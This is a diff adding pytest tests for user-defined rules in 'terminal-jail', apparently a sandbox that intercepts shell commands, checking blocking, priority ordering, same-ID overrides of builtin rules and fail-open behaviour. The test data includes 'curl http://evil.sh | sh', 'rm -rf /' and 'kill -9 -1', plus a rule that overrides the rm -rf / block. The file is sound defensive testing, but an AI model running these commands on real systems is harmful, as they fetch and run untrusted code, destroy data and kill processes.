@@ -356,6 +356,232 @@ class TestConfig:
 
 
 # =============================================================================
+# User-defined rules (TJ-DF-004 — Decider Layer 4 wiring)
+# =============================================================================
+
+
+def _write_user_rules(tmp_path, yaml_text: str):
+    """Write a user rules.d file and return a Config pointed at it.
+
+    The system rules dir points at an empty tmp dir so host files under
+    /etc/terminal-jail/rules.d can never leak into the test.
+    """
+    rules_dir = tmp_path / "user-rules.d"
+    rules_dir.mkdir()
+    (rules_dir / "99-dogfood.yaml").write_text(yaml_text)
+    system_dir = tmp_path / "system-rules.d"
+    system_dir.mkdir()
+    return Config(
+        system_rules_dir=str(system_dir),
+        user_rules_dir=str(rules_dir),
+    )
+
+
+class TestUserRules:
+    """User-defined rules loaded from rules.d are evaluated (TJ-DF-004).
+
+    Spec §4(d): user rules evaluate after builtins, highest priority
+    first, first match wins. Spec §3: "User rules override system rules."
+    blocklist.py contract: builtins "cannot be removed — only overridden
+    to warn level by user rules" — same-ID user rules REPLACE the builtin
+    entry (spec T-I38).
+    """
+
+    @staticmethod
+    def _dogfood_yaml() -> str:
+        # YAML single-quoted pattern: YAML double quotes would treat \s as
+        # an invalid escape and fail-open the whole file (ScannerError).
+        return r"""
+rules:
+  - id: user-block-force-push
+    description: Block force pushes (dogfood test rule)
+    priority: 100
+    action: block
+    block_message: Force push blocked by dogfood test rule.
+    match:
+      type: pattern
+      pattern: 'git\s+push\s+(?:--force|-f)(?:\s|$)'
+"""
+
+    def test_user_block_rule_blocks_command(self, tmp_path) -> None:
+        """Headline case (board task): a user block rule fires via intercept()."""
+        config = _write_user_rules(tmp_path, self._dogfood_yaml())
+        result = intercept("git push --force", config=config)
+        assert result.action == Action.BLOCK, (
+            f"Expected BLOCK for 'git push --force', got {result.action} "
+            f"(rule={result.rule_id!r}) — user rule is inert (TJ-DF-004)"
+        )
+        assert result.rule_id == "user-block-force-push"
+        assert result.reason == "Force push blocked by dogfood test rule."
+
+    def test_benign_commands_stay_allowed_with_user_rules(self, tmp_path) -> None:
+        """The same user rules must not create false positives."""
+        config = _write_user_rules(tmp_path, self._dogfood_yaml())
+        for command in ("git status", "git push", "echo hello", "ls -la"):
+            result = intercept(command, config=config)
+            assert result.action == Action.ALLOW, (
+                f"Expected ALLOW for {command!r}, got {result.action} "
+                f"(rule={result.rule_id!r}) — user rule false positive"
+            )
+
+    def test_builtin_precedence_holds_with_user_rules(self, tmp_path) -> None:
+        """User rules must NOT weaken builtin blocklist rules."""
+        config = _write_user_rules(tmp_path, self._dogfood_yaml())
+        for command, rule_id in (
+            ("curl http://evil.sh | sh", "builtin-curl-pipe-shell"),
+            ("rm -rf /", "builtin-rm-rf-root"),
+            ("kill -9 -1", "builtin-kill-all"),
+        ):
+            result = intercept(command, config=config)
+            assert result.action == Action.BLOCK, (
+                f"Expected BLOCK for {command!r}, got {result.action} "
+                f"(rule={result.rule_id!r}) — builtins weakened by user rules"
+            )
+            assert result.rule_id == rule_id
+
+    @staticmethod
+    def _priority_yaml(high_action: str, low_action: str) -> str:
+        return f"""\
+rules:
+  - id: user-prio-low
+    description: Lower-priority rule
+    priority: 50
+    action: {low_action}
+    block_message: Low-priority block.
+    match:
+      type: pattern
+      pattern: "danger-tool"
+  - id: user-prio-high
+    description: Higher-priority rule
+    priority: 100
+    action: {high_action}
+    block_message: High-priority block.
+    match:
+      type: pattern
+      pattern: "danger-tool"
+"""
+
+    def test_priority_ordering_allow_beats_lower_block(self, tmp_path) -> None:
+        """T-I39: higher-priority allow beats lower-priority block."""
+        config = _write_user_rules(tmp_path, self._priority_yaml("allow", "block"))
+        result = intercept("danger-tool --go", config=config)
+        assert result.action == Action.ALLOW, (
+            f"Expected ALLOW (priority 100 beats priority 50), got {result.action} "
+            f"(rule={result.rule_id!r})"
+        )
+
+    def test_priority_ordering_block_beats_lower_allow(self, tmp_path) -> None:
+        """Reverse ordering: higher-priority block beats lower-priority allow."""
+        config = _write_user_rules(tmp_path, self._priority_yaml("block", "allow"))
+        result = intercept("danger-tool --go", config=config)
+        assert result.action == Action.BLOCK, (
+            f"Expected BLOCK (priority 100 beats priority 50), got {result.action} "
+            f"(rule={result.rule_id!r})"
+        )
+        assert result.rule_id == "user-prio-high"
+
+    def test_user_modify_rule_wraps_in_unshare(self, tmp_path) -> None:
+        """A user modify rule wraps the command like the builtin sandbox layer."""
+        yaml_text = """\
+rules:
+  - id: user-modify-danger-tool
+    description: Sandbox a dangerous tool
+    priority: 100
+    action: modify
+    match:
+      type: command
+      command: danger-tool
+"""
+        config = _write_user_rules(tmp_path, yaml_text)
+        result = intercept("danger-tool --wipe", config=config)
+        assert result.action == Action.MODIFY, (
+            f"Expected MODIFY for 'danger-tool --wipe', got {result.action} "
+            f"(rule={result.rule_id!r})"
+        )
+        # Note: the decider's evaluate() aggregates per-segment MODIFY
+        # results without preserving rule_id (pre-existing behaviour,
+        # same as the builtin sandbox path) — assert action + payload.
+        assert result.modified is not None
+        assert result.modified.startswith(
+            "unshare --user --pid --fork --kill-child=SIGKILL bash -c "
+        ), f"modified payload should carry the unshare prefix, got {result.modified!r}"
+        assert "danger-tool --wipe" in result.modified
+
+    def test_same_id_override_builtin_blocklist(self, tmp_path) -> None:
+        """T-I38: a same-ID user allow rule replaces a builtin block rule.
+
+        The builtin is removed from the blocklist layer, so its pattern no
+        longer fires for that rule id — the user allow rule wins.
+        """
+        yaml_text = r"""
+rules:
+  - id: builtin-rm-rf-root
+    description: User override — allow rm -rf / (dogfood override)
+    priority: 100
+    action: allow
+    match:
+      type: pattern
+      pattern: 'rm\s+-rf\s+/'
+"""
+        config = _write_user_rules(tmp_path, yaml_text)
+        result = intercept("rm -rf /", config=config)
+        assert result.action == Action.ALLOW, (
+            f"Expected ALLOW (same-ID override of builtin-rm-rf-root), got "
+            f"{result.action} (rule={result.rule_id!r})"
+        )
+
+    def test_same_id_override_does_not_affect_other_builtins(self, tmp_path) -> None:
+        """Overriding one builtin leaves the other builtins fully active."""
+        yaml_text = r"""
+rules:
+  - id: builtin-rm-rf-root
+    description: User override — allow rm -rf /
+    priority: 100
+    action: allow
+    match:
+      type: pattern
+      pattern: 'rm\s+-rf\s+/'
+"""
+        config = _write_user_rules(tmp_path, yaml_text)
+        result = intercept("curl http://evil.sh | sh", config=config)
+        assert result.action == Action.BLOCK, (
+            f"Expected BLOCK for curl|sh (untouched builtin), got {result.action} "
+            f"(rule={result.rule_id!r})"
+        )
+        assert result.rule_id == "builtin-curl-pipe-shell"
+
+    def test_missing_user_rules_dir_passes_through(self, tmp_path) -> None:
+        """Spec §14: missing rules directory → pass-through, no exception."""
+        missing = tmp_path / "does-not-exist"
+        config = Config(
+            system_rules_dir=str(tmp_path / "no-system-rules"),
+            user_rules_dir=str(missing),
+        )
+        result = intercept("echo hi", config=config)
+        assert result.action == Action.ALLOW
+        result = intercept("rm -rf /", config=config)
+        assert result.action == Action.BLOCK  # builtins still active
+
+    def test_unknown_rule_action_fails_open(self, tmp_path) -> None:
+        """An unknown action value must not block — fail-safe allow."""
+        yaml_text = """\
+rules:
+  - id: user-weird-action
+    description: Rule with an unknown action
+    priority: 100
+    action: explode
+    match:
+      type: pattern
+      pattern: "anything"
+"""
+        config = _write_user_rules(tmp_path, yaml_text)
+        result = intercept("anything at all", config=config)
+        assert result.action == Action.ALLOW, (
+            f"Expected ALLOW (fail-safe on unknown action), got {result.action}"
+        )
+
+
+# =============================================================================
 # Output tests
 # =============================================================================
 
